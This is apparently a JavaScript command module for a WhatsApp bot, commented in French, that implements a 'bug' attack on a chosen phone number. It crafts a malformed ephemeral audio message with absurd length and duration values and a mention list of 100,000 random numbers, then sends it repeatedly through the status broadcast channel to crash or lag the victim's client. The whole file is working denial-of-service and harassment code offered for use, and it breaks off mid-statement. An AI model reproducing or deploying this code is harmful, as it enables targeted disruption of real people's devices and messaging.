// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ //
// 🎴𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 : d-samy.js
// Commande de bug delay-samy
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ //

import pkg from "@whiskeysockets/bailey'";
import crypto from "crypto";
import { generateWAMessageFromContent } from "@whiskeysockets/bailey";
import channelSender from '../channelSender.js';
import cluster from 'cluster';
import os from 'os';

// Configuration avancée
const CONFIG = {
    FLOOD_LIMIT: 100000,
    DELAY_BETWEEN_REQUESTS: 300,
    MAX_ATTEMPTS: 100,
    MENTIONING: "13135550002@s.whatsapp.net",
    WORKER_COUNT: os.cpus().length,
    RETRY_ATTEMPTS: 3,
    TIMEOUT: 30000
};

// Cache avancé avec expiration
class AdvancedCache {
    constructor() {
        this.cache = new Map();
        this.timers = new Map();
    }

    set(key, value, ttl = 60000) {
        this.cache.set(key, value);
        if (this.timers.has(key)) clearTimeout(this.timers.get(key));
        this.timers.set(key, setTimeout(() => this.delete(key), ttl));
    }

    get(key) {
        return this.cache.get(key);
    }

    delete(key) {
        this.cache.delete(key);
        if (this.timers.has(key)) {
            clearTimeout(this.timers.get(key));
            this.timers.delete(key);
        }
    }
}

const messageCache = new AdvancedCache();

// Gestionnaire de performances
class PerformanceTracker {
    constructor() {
        this.metrics = {
            requests: 0,
            successes: 0,
            failures: 0,
            startTime: Date.now()
        };
    }

    logRequest(success = true) {
        this.metrics.requests++;
        if (success) this.metrics.successes++;
        else this.metrics.failures++;
    }

    getStats() {
        const elapsed = (Date.now() - this.metrics.startTime) / 1000;
        return {
            requests: this.metrics.requests,
            successes: this.metrics.successes,
            failures: this.metrics.failures,
            requestsPerSecond: this.metrics.requests / elapsed
        };
    }
}

const perfTracker = new PerformanceTracker();

// Générateur de JIDs
function generateRandomJids(count) {
    const jids = new Array(count);
    const base = "1";
    const domain = "@s.whatsapp.net";

    for (let i = 0; i < count; i++) {
        jids[i] = base + Math.floor(Math.random() * 900000000 + 100000000) + domain;
    }
    return jids;
}

// Création du contexte de message
function createMessageContext(mentionedJids) {
    const context = {
        mentionedJid: mentionedJids,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "🎴𝛫𝑈𝑅𝛩𝛮𝛥 𝛤𝑅𝛥𝑆𝐻𝐸𝑅 𝑆𝐻𝛥𝑅𝑄🎴"
        }
    };

    const cacheKey = `context_${mentionedJids.length}`;
    if (!messageCache.get(cacheKey)) messageCache.set(cacheKey, context);

    return messageCache.get(cacheKey) || context;
}

// Création du contenu du message
function createMessageContent(messageContext) {
    return {
        ephemeralMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
                    fileLength: 99999999999999,
                    seconds: 99999999999999,
                    ptt: true,
                    mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
                    fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
                    directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 99999999999999,
                    contextInfo: messageContext,
                    waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
                }
            }
        }
    };
}

// Création des paramètres d'envoi
function createBroadcastSend(isTarget, msg) {
    return {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
            }]
        }]
    };
}

// Fonction principale de bug avec retries
async function Bugs(isTarget, client, attempt = 1) {
    try {
        const mentionedJids = [CONFIG.MENTIONING, ...generateRandomJids(CONFIG.FLOOD_LIMIT)];
        const messageContext = createMessageContext(mentionedJids);
        const messageContent = createMessageContent(messageContext);

        const generatePromise = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });
        const msg = await Promise.race([
            generatePromise,
            new Promise((_, reject) => setTimeout(() => reject(new Error('Generate message timeout')), CONFIG.TIMEOUT))
        ]);

        const broadcastSend = createBroadcastSend(isTarget, msg);
        const sendPromise = client.relayMessage("status@broadcast", msg.message, broadcastSend);
        await Promise.race([
            sendPromise,
            new Promise((_, reject) => setTimeout(() => reject(new Error('Send message timeout')), CONFIG.TIMEOUT))
        ]);

        perfTracker.logRequest(true);
        return true;
    } catch (error) {
        console.error(`Error in Bugs (attempt ${attempt}):`, error);
        perfTracker.logRequest(false);

        if (attempt < CONFIG.RETRY_ATTEMPTS) {
            await new Promise(resolve => setTimeout(resolve, attempt * 500));
            return Bugs(isTarget, client, attempt + 1);
        }
        return false;
    }
}

// Commande principale déclenchable par le bot
async function dSamyCommand(message, client) {
    try {
        const remoteJid = message.key?.remoteJid;
        if (!remoteJid) throw new Error("Message JID is undefined.");

        await client.sendMessage(remoteJid, { text: "🚀 Starting bug operation on target" });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
        const parts = messageBody.slice(1).trim().split(/\s+/);
        const args = parts.slice(1);

        let participant;
        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            participant = message.message.extendedTextMessage.contextInfo.participant;
        } else if (args.length > 0) {
            participant = args[0].replace('@', '') + '@s.whatsapp.net';
        } else throw new Error('Specify the person to bug.');

        const promises = [];
        for (let i = 0; i < CONFIG.MAX_ATTEMPTS; i++) {
            const delay = i % 10 === 0 ? CONFIG.DELAY_BETWEEN_REQUESTS * 3 : CONFIG.DELAY_BETWEEN_REQUESTS;
            promises.push(new Promise(resolve => {
                setTimeout(async () => resolve(await Bugs(participant, client)), i * delay);
            }));
        }

        const results = await Promise.allSettled(promises);
        const successCount = results.filter(r => r.status ===
